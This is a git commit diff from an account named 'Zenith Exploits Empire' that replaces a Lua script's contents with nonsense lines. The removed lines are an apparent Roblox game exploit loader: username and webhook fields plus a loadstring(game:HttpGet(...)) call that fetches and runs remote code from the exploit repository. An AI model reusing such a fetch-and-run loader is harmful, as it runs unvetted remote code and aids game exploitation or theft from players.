b25f271d70abc78f1108ec7b9fd68580a70875ef
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 17:14:15 +0200

    Overwrite auraisop.lua

--- scripts/auraisop.lua
+++ scripts/auraisop.lua
@@ -1,7 +1,7 @@
+hello
 
-Username = "hi"
-Username2 = "hi"
-Webhook = "hi.com.xd"
+my is
 
--- The rest of the code stays constant, and only the three fields above are updated dynamically
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
+jon cenaaa
+
+sike
